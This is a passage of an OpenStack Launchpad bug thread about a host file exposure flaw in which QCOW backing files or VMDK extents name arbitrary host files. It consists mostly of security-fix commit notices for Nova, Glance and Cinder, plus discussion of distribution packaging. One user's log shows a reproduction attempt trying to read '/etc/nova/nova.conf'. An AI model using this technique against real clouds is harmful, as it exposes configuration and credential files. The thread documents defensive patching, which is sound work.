Reviewed: [https://review.opendev.org/c/openstack/glance/+/871617](https://review.opendev.org/c/openstack/glance/%2B/871617)

Committed: <https://opendev.org/openstack/glance/commit/dc8e5a5cc7f5e9d1b697e520a7533cc90516db1b>

Submitter: "Zuul (22348)"

Branch: stable/yoga

commit dc8e5a5cc7f5e9d1b697e520a7533cc90516db1b

Author: Dan Smith <email address hidden>

Date: Mon Dec 19 15:00:35 2022 +0000

Enforce image safety during image\_conversion

This does two things:

1. It makes us check that the QCOW backing\_file is unset on those

    types of images. Nova and Cinder do this already to prevent an

    arbitrary (and trivial to accomplish) host file exposure exploit.

    2. It makes us restrict VMDK files to only allowed subtypes. These

    files can name arbitrary files on disk as extents, providing the

    same sort of attack. Default that list to just the types we believe

    are actually useful for openstack, and which are monolithic.

The configuration option to specify allowed subtypes is added in

    glance's config and not in the import options so that we can extend

    this check later to image ingest. The format\_inspector can tell us

    what the type and subtype is, and we could reject those images early

    and even in the case where image\_conversion is not enabled.

Closes-Bug: #1996188

    Change-Id: Idf561f6306cebf756c787d8eefdc452ce44bd5e0

    (cherry picked from commit 0d6282a01691cecc2798f7858b181c4bb30f850c)

    (cherry picked from commit 4967ab6935cfd0274ae801ac943d01909a236a0a)

Reviewed: https://review.opendev.org/c/openstack/glance/+/871617
Committed: https://opendev.org/openstack/glance/commit/dc8e5a5cc7f5e9d1b697e520a7533cc90516db1b
Submitter: "Zuul (22348)"
Branch: stable/yoga
commit dc8e5a5cc7f5e9d1b697e520a7533cc90516db1b
Author: Dan Smith <dansmith@redhat.com>
Date: Mon Dec 19 15:00:35 2022 +0000
Enforce image safety during image\_conversion
This does two things:
1. It makes us check that the QCOW backing\_file is unset on those
types of images. Nova and Cinder do this already to prevent an
arbitrary (and trivial to accomplish) host file exposure exploit.
2. It makes us restrict VMDK files to only allowed subtypes. These
files can name arbitrary files on disk as extents, providing the
same sort of attack. Default that list to just the types we believe
are actually useful for openstack, and which are monolithic.
The configuration option to specify allowed subtypes is added in
glance's config and not in the import options so that we can extend
this check later to image ingest. The format\_inspector can tell us
what the type and subtype is, and we could reject those images early
and even in the case where image\_conversion is not enabled.
Closes-Bug: #1996188
Change-Id: Idf561f6306cebf756c787d8eefdc452ce44bd5e0
(cherry picked from commit 0d6282a01691cecc2798f7858b181c4bb30f850c)
(cherry picked from commit 4967ab6935cfd0274ae801ac943d01909a236a0a)

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Jeremy Stanley (fungi)](https://launchpad.net/~fungi) wrote on 2023-01-25: |  |  | [#154](/nova/%2Bbug/1996188/comments/154) |
| --- | --- | --- | --- |

Christian: OpenStack's vulnerability coordinators provide advance copies of embargoed security fixes to representatives of distributions including Ubuntu. We also notify the private linux-distros mailing list where they have representatives subscribed. At time of publication we circulate our advisories not only to our community's openstack-announce and openstack-discuss mailing lists, but also the broader <email address hidden> discussion list where they participate.

OpenStack is packaged and included in numerous distributions. The available time for our vulnerability coordinators is already quite minimal, and we simply cannot follow every single distribution's custom workflow for requesting that they act on security advisories. If a distribution you use isn't providing updated packages with the fixes we've supplied in a timely enough manner to suit your tastes, please follow up with them directly. It will mean more coming from their users than from me even if I did have the time to do so.

Christian: OpenStack's vulnerability coordinators provide advance copies of embargoed security fixes to representatives of distributions including Ubuntu. We also notify the private linux-distros mailing list where they have representatives subscribed. At time of publication we circulate our advisories not only to our community's openstack-announce and openstack-discuss mailing lists, but also the broader oss-security@lists-openwall.com discussion list where they participate.
OpenStack is packaged and included in numerous distributions. The available time for our vulnerability coordinators is already quite minimal, and we simply cannot follow every single distribution's custom workflow for requesting that they act on security advisories. If a distribution you use isn't providing updated packages with the fixes we've supplied in a timely enough manner to suit your tastes, please follow up with them directly. It will mean more coming from their users than from me even if I did have the time to do so.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2023-01-25:  [**Related fix merged to nova (stable/zed)**](/nova/%2Bbug/1996188/comments/155) |  |  | [#155](/nova/%2Bbug/1996188/comments/155) |
| --- | --- | --- | --- |

Reviewed: [https://review.opendev.org/c/openstack/nova/+/871616](https://review.opendev.org/c/openstack/nova/%2B/871616)

Committed: <https://opendev.org/openstack/nova/commit/6e8ed78470edbae7b58d75e9e9f4f62bdb30a170>

Submitter: "Zuul (22348)"

Branch: stable/zed

commit 6e8ed78470edbae7b58d75e9e9f4f62bdb30a170

Author: Dan Smith <email address hidden>

Date: Thu Nov 10 09:55:48 2022 -0800

[stable-only][cve] Check VMDK create-type against an allowed list

NOTE(sbauza): Stable policy allows us to proactively merge a backport without waiting for the parent patch to be merged (exception to rule #4 in [1]. Marking [stable-only] in order to silence nova-tox-validate-backport

[1] <https://docs.openstack.org/project-team-guide/stable-branches.html#appropriate-fixes>

Related-Bug: #1996188

    Change-Id: I5a399f1d3d702bfb76c067893e9c924904c8c360

Reviewed: https://review.opendev.org/c/openstack/nova/+/871616
Committed: https://opendev.org/openstack/nova/commit/6e8ed78470edbae7b58d75e9e9f4f62bdb30a170
Submitter: "Zuul (22348)"
Branch: stable/zed
commit 6e8ed78470edbae7b58d75e9e9f4f62bdb30a170
Author: Dan Smith <dansmith@redhat.com>
Date: Thu Nov 10 09:55:48 2022 -0800
[stable-only][cve] Check VMDK create-type against an allowed list
NOTE(sbauza): Stable policy allows us to proactively merge a backport without waiting for the parent patch to be merged (exception to rule #4 in [1]. Marking [stable-only] in order to silence nova-tox-validate-backport
[1] https://docs.openstack.org/project-team-guide/stable-branches.html#appropriate-fixes
Related-Bug: #1996188
Change-Id: I5a399f1d3d702bfb76c067893e9c924904c8c360

| **tags**: | added: in-stable-xena |
| --- | --- |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2023-01-25:  [**Fix merged to cinder (stable/xena)**](/nova/%2Bbug/1996188/comments/156) |  |  | [#156](/nova/%2Bbug/1996188/comments/156) |
| --- | --- | --- | --- |

Reviewed: [https://review.opendev.org/c/openstack/cinder/+/871625](https://review.opendev.org/c/openstack/cinder/%2B/871625)

Committed: <https://opendev.org/openstack/cinder/commit/e96415409daa158cc503c1adec1ca1ca4f940082>

Submitter: "Zuul (22348)"

Branch: stable/xena

commit e96415409daa158cc503c1adec1ca1ca4f940082

Author: Brian Rosmaita <email address hidden>

Date: Sat Dec 10 17:09:36 2022 -0500

Check VMDK subformat against an allowed list

Also add a more general check to convert\_image that the image format

    reported by qemu-img matches what the caller says it is.

Change-Id: I3c60ee4c0795aadf03108ed9b5a46ecd116894af

    Partial-bug: #1996188

    (cherry picked from commit 930fc93e9fda82a4aa4568ae149c3c80af7379d0)

    (cherry picked from commit ba37dc2ead69c08d7ede242295ff997086e6121d)

    Conflicts:

      cinder/image/image\_utils.py

       - changed type annotations to use implicit Optional to be

         consistent with cinder yoga mypy usage

       - removed refs to image\_conversion\_disable in tests

    (cherry picked from commit 2ae5d53526e2b224d81b3259140c59aba97d72c3)

Reviewed: https://review.opendev.org/c/openstack/cinder/+/871625
Committed: https://opendev.org/openstack/cinder/commit/e96415409daa158cc503c1adec1ca1ca4f940082
Submitter: "Zuul (22348)"
Branch: stable/xena
commit e96415409daa158cc503c1adec1ca1ca4f940082
Author: Brian Rosmaita <rosmaita.fossdev@gmail.com>
Date: Sat Dec 10 17:09:36 2022 -0500
Check VMDK subformat against an allowed list
Also add a more general check to convert\_image that the image format
reported by qemu-img matches what the caller says it is.
Change-Id: I3c60ee4c0795aadf03108ed9b5a46ecd116894af
Partial-bug: #1996188
(cherry picked from commit 930fc93e9fda82a4aa4568ae149c3c80af7379d0)
(cherry picked from commit ba37dc2ead69c08d7ede242295ff997086e6121d)
Conflicts:
cinder/image/image\_utils.py
- changed type annotations to use implicit Optional to be
consistent with cinder yoga mypy usage
- removed refs to image\_conversion\_disable in tests
(cherry picked from commit 2ae5d53526e2b224d81b3259140c59aba97d72c3)

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2023-01-25:  [**Fix merged to glance (stable/xena)**](/nova/%2Bbug/1996188/comments/157) |  |  | [#157](/nova/%2Bbug/1996188/comments/157) |
| --- | --- | --- | --- |

Reviewed: [https://review.opendev.org/c/openstack/glance/+/871619](https://review.opendev.org/c/openstack/glance/%2B/871619)

Committed: <https://opendev.org/openstack/glance/commit/f45b5f024e765f0000884dfec5ac222124cfbc6d>

Submitter: "Zuul (22348)"

Branch: stable/xena

commit f45b5f024e765f0000884dfec5ac222124cfbc6d

Author: Dan Smith <email address hidden>

Date: Mon Dec 19 15:00:35 2022 +0000

Enforce image safety during image\_conversion

This does two things:

1. It makes us check that the QCOW backing\_file is unset on those

    types of images. Nova and Cinder do this already to prevent an

    arbitrary (and trivial to accomplish) host file exposure exploit.

    2. It makes us restrict VMDK files to only allowed subtypes. These

    files can name arbitrary files on disk as extents, providing the

    same sort of attack. Default that list to just the types we believe

    are actually useful for openstack, and which are monolithic.

The configuration option to specify allowed subtypes is added in

    glance's config and not in the import options so that we can extend

    this check later to image ingest. The format\_inspector can tell us

    what the type and subtype is, and we could reject those images early

    and even in the case where image\_conversion is not enabled.

Closes-Bug: #1996188

    Change-Id: Idf561f6306cebf756c787d8eefdc452ce44bd5e0

    (cherry picked from commit 0d6282a01691cecc2798f7858b181c4bb30f850c)

    (cherry picked from commit 4967ab6935cfd0274ae801ac943d01909a236a0a)

    (cherry picked from commit dc8e5a5cc7f5e9d1b697e520a7533cc90516db1b)

Reviewed: https://review.opendev.org/c/openstack/glance/+/871619
Committed: https://opendev.org/openstack/glance/commit/f45b5f024e765f0000884dfec5ac222124cfbc6d
Submitter: "Zuul (22348)"
Branch: stable/xena
commit f45b5f024e765f0000884dfec5ac222124cfbc6d
Author: Dan Smith <dansmith@redhat.com>
Date: Mon Dec 19 15:00:35 2022 +0000
Enforce image safety during image\_conversion
This does two things:
1. It makes us check that the QCOW backing\_file is unset on those
types of images. Nova and Cinder do this already to prevent an
arbitrary (and trivial to accomplish) host file exposure exploit.
2. It makes us restrict VMDK files to only allowed subtypes. These
files can name arbitrary files on disk as extents, providing the
same sort of attack. Default that list to just the types we believe
are actually useful for openstack, and which are monolithic.
The configuration option to specify allowed subtypes is added in
glance's config and not in the import options so that we can extend
this check later to image ingest. The format\_inspector can tell us
what the type and subtype is, and we could reject those images early
and even in the case where image\_conversion is not enabled.
Closes-Bug: #1996188
Change-Id: Idf561f6306cebf756c787d8eefdc452ce44bd5e0
(cherry picked from commit 0d6282a01691cecc2798f7858b181c4bb30f850c)
(cherry picked from commit 4967ab6935cfd0274ae801ac943d01909a236a0a)
(cherry picked from commit dc8e5a5cc7f5e9d1b697e520a7533cc90516db1b)

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2023-01-25:  [**Related fix merged to nova (stable/xena)**](/nova/%2Bbug/1996188/comments/158) |  |  | [#158](/nova/%2Bbug/1996188/comments/158) |
| --- | --- | --- | --- |

Reviewed: [https://review.opendev.org/c/openstack/nova/+/871622](https://review.opendev.org/c/openstack/nova/%2B/871622)

Committed: <https://opendev.org/openstack/nova/commit/867c4dd893ea7211e89b78b22b8da920a74622ff>

Submitter: "Zuul (22348)"

Branch: stable/xena

commit 867c4dd893ea7211e89b78b22b8da920a74622ff

Author: Dan Smith <email address hidden>

Date: Thu Nov 10 09:55:48 2022 -0800

[stable-only][cve] Check VMDK create-type against an allowed list

Trivial conflicts on xena only in:

            nova/conf/compute.py

NOTE(sbauza): Stable policy allows us to proactively merge a backport without waiting for the parent patch to be merged (exception to rule #4 in [1]. Marking [stable-only] in order to silence nova-tox-validate-backport

[1] <https://docs.openstack.org/project-team-guide/stable-branches.html#appropriate-fixes>

Related-Bug: #1996188

    Change-Id: I5a399f1d3d702bfb76c067893e9c924904c8c360

Reviewed: https://review.opendev.org/c/openstack/nova/+/871622
Committed: https://opendev.org/openstack/nova/commit/867c4dd893ea7211e89b78b22b8da920a74622ff
Submitter: "Zuul (22348)"
Branch: stable/xena
commit 867c4dd893ea7211e89b78b22b8da920a74622ff
Author: Dan Smith <dansmith@redhat.com>
Date: Thu Nov 10 09:55:48 2022 -0800
[stable-only][cve] Check VMDK create-type against an allowed list
Trivial conflicts on xena only in:
nova/conf/compute.py
NOTE(sbauza): Stable policy allows us to proactively merge a backport without waiting for the parent patch to be merged (exception to rule #4 in [1]. Marking [stable-only] in order to silence nova-tox-validate-backport
[1] https://docs.openstack.org/project-team-guide/stable-branches.html#appropriate-fixes
Related-Bug: #1996188
Change-Id: I5a399f1d3d702bfb76c067893e9c924904c8c360

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2023-01-25:  [**Related fix merged to nova (stable/yoga)**](/nova/%2Bbug/1996188/comments/159) |  |  | [#159](/nova/%2Bbug/1996188/comments/159) |
| --- | --- | --- | --- |

Reviewed: [https://review.opendev.org/c/openstack/nova/+/871624](https://review.opendev.org/c/openstack/nova/%2B/871624)

Committed: <https://opendev.org/openstack/nova/commit/516f0de1f6a54cd24d8ebc906c1e3fd3bab0d32e>

Submitter: "Zuul (22348)"

Branch: stable/yoga

commit 516f0de1f6a54cd24d8ebc906c1e3fd3bab0d32e

Author: Dan Smith <email address hidden>

Date: Thu Nov 10 09:55:48 2022 -0800

[stable-only][cve] Check VMDK create-type against an allowed list

NOTE(sbauza): Stable policy allows us to proactively merge a backport without waiting for the parent patch to be merged (exception to rule #4 in [1]. Marking [stable-only] in order to silence nova-tox-validate-backport

[1] <https://docs.openstack.org/project-team-guide/stable-branches.html#appropriate-fixes>

Related-Bug: #1996188

    Change-Id: I5a399f1d3d702bfb76c067893e9c924904c8c360

Reviewed: https://review.opendev.org/c/openstack/nova/+/871624
Committed: https://opendev.org/openstack/nova/commit/516f0de1f6a54cd24d8ebc906c1e3fd3bab0d32e
Submitter: "Zuul (22348)"
Branch: stable/yoga
commit 516f0de1f6a54cd24d8ebc906c1e3fd3bab0d32e
Author: Dan Smith <dansmith@redhat.com>
Date: Thu Nov 10 09:55:48 2022 -0800
[stable-only][cve] Check VMDK create-type against an allowed list
NOTE(sbauza): Stable policy allows us to proactively merge a backport without waiting for the parent patch to be merged (exception to rule #4 in [1]. Marking [stable-only] in order to silence nova-tox-validate-backport
[1] https://docs.openstack.org/project-team-guide/stable-branches.html#appropriate-fixes
Related-Bug: #1996188
Change-Id: I5a399f1d3d702bfb76c067893e9c924904c8c360

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Christian Rohmann (christian-rohmann)](https://launchpad.net/~christian-rohmann) wrote on 2023-01-25 (last edit on 2023-01-26): |  |  | [#160](/nova/%2Bbug/1996188/comments/160) |
| --- | --- | --- | --- |

Jeremy: Thanks for your response. I did not mean to imply you did not inform to the best of your abilities. I rather wanted to mention recent experience with the SRU process of the Ubuntu Cloud Archive, which apparently does mean there are no new packages built and released for stable branch point releases per se.

I know opened an SRU bug ([https://bugs.launchpad.net/cloud-archive/+bug/2003899](https://bugs.launchpad.net/cloud-archive/%2Bbug/2003899)) pointing to this bug here asking for new packages.

FWIW, I totally agree that the issue of the UCA not automatically providing new packages to fix critical (security) bugs is not something the OpenStack team is responsible for having sent out notifications on all the usual channels. But since UCA is a quite popular source for OpenStack packages and it's also used and promoted by deployment tooling like openstack-ansible I believe it's worth ask why the notification of incoming security fixes seems to not work as smooth here as with other distros.

Jeremy: Thanks for your response. I did not mean to imply you did not inform to the best of your abilities. I rather wanted to mention recent experience with the SRU process of the Ubuntu Cloud Archive, which apparently does mean there are no new packages built and released for stable branch point releases per se.
I know opened an SRU bug (https://bugs.launchpad.net/cloud-archive/+bug/2003899) pointing to this bug here asking for new packages.
FWIW, I totally agree that the issue of the UCA not automatically providing new packages to fix critical (security) bugs is not something the OpenStack team is responsible for having sent out notifications on all the usual channels. But since UCA is a quite popular source for OpenStack packages and it's also used and promoted by deployment tooling like openstack-ansible I believe it's worth ask why the notification of incoming security fixes seems to not work as smooth here as with other distros.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2023-01-26:  [**Fix proposed to cinder (stable/rocky)**](/nova/%2Bbug/1996188/comments/161) |  |  | [#161](/nova/%2Bbug/1996188/comments/161) |
| --- | --- | --- | --- |

Fix proposed to branch: stable/rocky

Review: [https://review.opendev.org/c/openstack/cinder/+/871817](https://review.opendev.org/c/openstack/cinder/%2B/871817)

Fix proposed to branch: stable/rocky
Review: https://review.opendev.org/c/openstack/cinder/+/871817

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2023-01-26:  [**Fix merged to glance (stable/victoria)**](/nova/%2Bbug/1996188/comments/162) |  |  | [#162](/nova/%2Bbug/1996188/comments/162) |
| --- | --- | --- | --- |

Reviewed: [https://review.opendev.org/c/openstack/glance/+/871623](https://review.opendev.org/c/openstack/glance/%2B/871623)

Committed: <https://opendev.org/openstack/glance/commit/06e6be579156d8bf2ce8e021d07d6f351fb88c07>

Submitter: "Zuul (22348)"

Branch: stable/victoria

commit 06e6be579156d8bf2ce8e021d07d6f351fb88c07

Author: Dan Smith <email address hidden>

Date: Mon Dec 19 15:00:35 2022 +0000

Enforce image safety during image\_conversion

This does two things:

1. It makes us check that the QCOW backing\_file is unset on those

    types of images. Nova and Cinder do this already to prevent an

    arbitrary (and trivial to accomplish) host file exposure exploit.

    2. It makes us restrict VMDK files to only allowed subtypes. These

    files can name arbitrary files on disk as extents, providing the

    same sort of attack. Default that list to just the types we believe

    are actually useful for openstack, and which are monolithic.

The configuration option to specify allowed subtypes is added in

    glance's config and not in the import options so that we can extend

    this check later to image ingest. The format\_inspector can tell us

    what the type and subtype is, and we could reject those images early

    and even in the case where image\_conversion is not enabled.

Closes-Bug: #1996188

    Change-Id: Idf561f6306cebf756c787d8eefdc452ce44bd5e0

    (cherry picked from commit 0d6282a01691cecc2798f7858b181c4bb30f850c)

    (cherry picked from commit 4967ab6935cfd0274ae801ac943d01909a236a0a)

    (cherry picked from commit dc8e5a5cc7f5e9d1b697e520a7533cc90516db1b)

    (cherry picked from commit f45b5f024e765f0000884dfec5ac222124cfbc6d)

    (cherry picked from commit 9a98c4a7d1358cdae009cc8fb6377160a126ea7b)

    Conflicts: glance/tests/unit/async\_/flows/plugins/test\_image\_conversion.py

       - removed code related to missing tests - 050802dd67b9135e04a65d340531157c94248c51

Reviewed: https://review.opendev.org/c/openstack/glance/+/871623
Committed: https://opendev.org/openstack/glance/commit/06e6be579156d8bf2ce8e021d07d6f351fb88c07
Submitter: "Zuul (22348)"
Branch: stable/victoria
commit 06e6be579156d8bf2ce8e021d07d6f351fb88c07
Author: Dan Smith <dansmith@redhat.com>
Date: Mon Dec 19 15:00:35 2022 +0000
Enforce image safety during image\_conversion
This does two things:
1. It makes us check that the QCOW backing\_file is unset on those
types of images. Nova and Cinder do this already to prevent an
arbitrary (and trivial to accomplish) host file exposure exploit.
2. It makes us restrict VMDK files to only allowed subtypes. These
files can name arbitrary files on disk as extents, providing the
same sort of attack. Default that list to just the types we believe
are actually useful for openstack, and which are monolithic.
The configuration option to specify allowed subtypes is added in
glance's config and not in the import options so that we can extend
this check later to image ingest. The format\_inspector can tell us
what the type and subtype is, and we could reject those images early
and even in the case where image\_conversion is not enabled.
Closes-Bug: #1996188
Change-Id: Idf561f6306cebf756c787d8eefdc452ce44bd5e0
(cherry picked from commit 0d6282a01691cecc2798f7858b181c4bb30f850c)
(cherry picked from commit 4967ab6935cfd0274ae801ac943d01909a236a0a)
(cherry picked from commit dc8e5a5cc7f5e9d1b697e520a7533cc90516db1b)
(cherry picked from commit f45b5f024e765f0000884dfec5ac222124cfbc6d)
(cherry picked from commit 9a98c4a7d1358cdae009cc8fb6377160a126ea7b)
Conflicts: glance/tests/unit/async\_/flows/plugins/test\_image\_conversion.py
- removed code related to missing tests - 050802dd67b9135e04a65d340531157c94248c51

| **tags**: | added: in-stable-victoria |
| --- | --- |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2023-01-27:  [**Related fix proposed to cinder (master)**](/nova/%2Bbug/1996188/comments/163) |  |  | [#163](/nova/%2Bbug/1996188/comments/163) |
| --- | --- | --- | --- |

Related fix proposed to branch: master

Review: [https://review.opendev.org/c/openstack/cinder/+/871976](https://review.opendev.org/c/openstack/cinder/%2B/871976)

Related fix proposed to branch: master
Review: https://review.opendev.org/c/openstack/cinder/+/871976

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Sylvain Bauza (sylvain-bauza)](https://launchpad.net/~sylvain-bauza) wrote on 2023-01-27: |  |  | [#164](/nova/%2Bbug/1996188/comments/164) |
| --- | --- | --- | --- |

[https://review.opendev.org/c/openstack/nova/+/871612](https://review.opendev.org/c/openstack/nova/%2B/871612) is now merged, putting the bug report to Fix Released.

https://review.opendev.org/c/openstack/nova/+/871612 is now merged, putting the bug report to Fix Released.

| Changed in nova: | |
| --- | --- |
| **importance**: | Undecided → Critical |
| **status**: | New → Confirmed |
| **status**: | Confirmed → Fix Released |

[Brian Rosmaita (brian-rosmaita)](https://launchpad.net/~brian-rosmaita)
on 2023-01-27

| Changed in cinder: | |
| --- | --- |
| **importance**: | Undecided → Critical |
| **status**: | In Progress → Fix Released |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Giuseppe Petralia (peppepetra)](https://launchpad.net/~peppepetra) wrote on 2023-01-30: |  |  | [#165](/nova/%2Bbug/1996188/comments/165) |
| --- | --- | --- | --- |

I am trying to reproduce the bug with a focal/ussuri openstack and step 4 (creating the VM) is failing for me with error:

2023-01-30 11:45:24.823 62889 ERROR nova.compute.manager [req-54de4256-c3b0-46d9-9fa3-e1b17a81e5cb 7e70ed49536144699c3b2202b699b2a9 39b49452b4184ba4a07df3f50e600de8 - 1a40c665d79e45e6ba

d525d061cdb548 1a40c665d79e45e6bad525d061cdb548] [instance: e5814346-68e2-4ab0-b6ed-31c3ddf627ef] Failed to build and run instance: libvirt.libvirtError: internal error: process exited

while connecting to monitor: 2023-01-30T11:45:23.807934Z qemu-system-x86\_64: -blockdev {"node-name":"libvirt-4-format","read-only":true,"discard":"unmap","cache":{"direct":true,"no-flus

h":false},"driver":"vmdk","file":"libvirt-4-storage","backing":null}: Could not open '/etc/nova/nova.conf': Permission denied

My nova version is:

root@juju-c1f3a4-peppepetra-8:~# dpkg -l | grep nova

ii nova-api-metadata 2:21.2.4-0ubuntu2 all OpenStack Compute - metadata API frontend

ii nova-common 2:21.2.4-0ubuntu2 all OpenStack Compute - common files

ii nova-compute 2:21.2.4-0ubuntu2 all OpenStack Compute - compute node base

ii nova-compute-kvm 2:21.2.4-0ubuntu2 all OpenStack Compute - compute node (KVM)

ii nova-compute-libvirt 2:21.2.4-0ubuntu2 all OpenStack Compute - compute node libvirt support

ii python3-nova 2:21.2.4-0ubuntu2 all OpenStack Compute Python 3 libraries

ii python3-novaclient 2:17.0.0-0ubuntu1 all client library for OpenStack Compute API - 3.x

Can you please tell me on which nova version are you seeing this issue?

I am trying to reproduce the bug with a focal/ussuri openstack and step 4 (creating the VM) is failing for me with error:
2023-01-30 11:45:24.823 62889 ERROR nova.compute.manager [req-54de4256-c3b0-46d9-9fa3-e1b17a81e5cb 7e70ed49536144699c3b2202b699b2a9 39b49452b4184ba4a07df3f50e600de8 - 1a40c665d79e45e6ba
d525d061cdb548 1a40c665d79e45e6bad525d061cdb548] [instance: e5814346-68e2-4ab0-b6ed-31c3ddf627ef] Failed to build and run instance: libvirt.libvirtError: internal error: process exited
while connecting to monitor: 2023-01-30T11:45:23.807934Z qemu-system-x86\_64: -blockdev {"node-name":"libvirt-4-format","read-only":true,"discard":"unmap","cache":{"direct":true,"no-flus
h":false},"driver":"vmdk","file":"libvirt-4-storage","backing":null}: Could not open '/etc/nova/nova.conf': Permission denied
My nova version is:
root@juju-c1f3a4-peppepetra-8:~# dpkg -l | grep nova
ii nova-api-metadata 2:21.2.4-0ubuntu2 all OpenStack Compute - metadata API frontend
ii nova-common 2:21.2.4-0ubuntu2 all OpenStack Compute - common files
ii nova-compute 2:21.2.4-0ubuntu2 all OpenStack Compute - compute node base
ii nova-compute-kvm 2:21.2.4-0ubuntu2 all OpenStack Compute - compute node (KVM)
ii nova-compute-libvirt 2:21.2.4-0ubuntu2 all OpenStack Compute - compute node libvirt support
ii python3-nova 2:21.2.4-0ubuntu2 all OpenStack Compute Python 3 libraries
ii python3-novaclient 2:17.0.0-0ubuntu1 all client library for OpenStack Compute API - 3.x
Can you please tell me on which nova version are you seeing this issue?

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Sylvain Bauza (sylvain-bauza)](https://launchpad.net/~sylvain-bauza) wrote on 2023-01-31: |  |  | [#166](/nova/%2Bbug/1996188/comments/166) |
| --- | --- | --- | --- |

Honestly, now this bug report is public, I don't really want to discuss about the attack vectors and how to reproduce the security issue.

At least what you need to know is that all the Nova releases versions had the bug until we fixed it.

Honestly, now this bug report is public, I don't really want to discuss about the attack vectors and how to reproduce the security issue.
At least what you need to know is that all the Nova releases versions had the bug until we fixed it.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2023-01-31:  [**Fix included in openstack/glance 23.1.0**](/nova/%2Bbug/1996188/comments/167) |  |  | [#167](/nova/%2Bbug/1996188/comments/167) |
| --- | --- | --- | --- |

This issue was fixed in the openstack/glance 23.1.0 release.

This issue was fixed in the openstack/glance 23.1.0 release.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2023-01-31:  [**Fix included in openstack/glance 24.2.0**](/nova/%2Bbug/1996188/comments/168) |  |  | [#168](/nova/%2Bbug/1996188/comments/168) |
| --- | --- | --- | --- |

This issue was fixed in the openstack/glance 24.2.0 release.

This issue was fixed in the openstack/glance 24.2.0 release.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2023-01-31:  [**Fix included in openstack/glance 25.1.0**](/nova/%2Bbug/1996188/comments/169) |  |  | [#169](/nova/%2Bbug/1996188/comments/169) |
| --- | --- | --- | --- |

This issue was fixed in the openstack/glance 25.1.0 release.

This issue was fixed in the openstack/glance 25.1.0 release.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Brian Rosmaita (brian-rosmaita)](https://launchpad.net/~brian-rosmaita) wrote on 2023-01-31: |  |  | [#170](/nova/%2Bbug/1996188/comments/170) |
| --- | --- | --- | --- |

@Guiseppe at comment #165:

This line in your output shows that the "backing file" exploit was attempted:

Could not open '/etc/nova/nova.conf': Permission denied

Luckily it didn't succeed due to a permissions issue, but it might succeed for other files in your installation, so you should definitely upgrade/patch it.

@Guiseppe at comment #165:
This line in your output shows that the "backing file" exploit was attempted:
Could not open '/etc/nova/nova.conf': Permission denied
Luckily it didn't succeed due to a permissions issue, but it might succeed for other files in your installation, so you should definitely upgrade/patch it.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Bjoern (bjoern-t)](https://launchpad.net/~bjoern-t) wrote on 2023-01-31: |  |  | [#171](/nova/%2Bbug/1996188/comments/171) |
| --- | --- | --- | --- |

Hello,

are we expecting patches for Rocky as it is still in EM?

But it seems based on oslo\_utils.imageutils changes it can't easily be back ported it seems.

Could you add a clarification for Rocky ?

Hello,
are we expecting patches for Rocky as it is still in EM?
But it seems based on oslo\_utils.imageutils changes it can't easily be back ported it seems.
Could you add a clarification for Rocky ?

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Jeremy Stanley (fungi)](https://launchpad.net/~fungi) wrote on 2023-01-31: |  |  | [#172](/nova/%2Bbug/1996188/comments/172) |
| --- | --- | --- | --- |

Bjoern: There should be no expectations where extended maintenance[\*] branches are concerned. Projects can voluntarily leave their branches open when they reach the extended maintenance phase, in order to facilitate collaboration between interested community members (typically package maintainers for distributions providing downstream support for those versions). If you are interested in supplying a backport to stable/rocky, please push it into Gerrit for reviewing.

Also, be aware that a proposal[\*\*] has already been floated to close stable/rocky on all projects, so there may not be much time left to get patches merged there if you have them.

[\*] <https://docs.openstack.org/project-team-guide/stable-branches.html#extended-maintenance>

[\*\*] <https://lists.openstack.org/pipermail/openstack-discuss/2023-January/031922.html>

Bjoern: There should be no expectations where extended maintenance[\*] branches are concerned. Projects can voluntarily leave their branches open when they reach the extended maintenance phase, in order to facilitate collaboration between interested community members (typically package maintainers for distributions providing downstream support for those versions). If you are interested in supplying a backport to stable/rocky, please push it into Gerrit for reviewing.
Also, be aware that a proposal[\*\*] has already been floated to close stable/rocky on all projects, so there may not be much time left to get patches merged there if you have them.
[\*] https://docs.openstack.org/project-team-guide/stable-branches.html#extended-maintenance
[\*\*] https://lists.openstack.org/pipermail/openstack-discuss/2023-January/031922.html

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

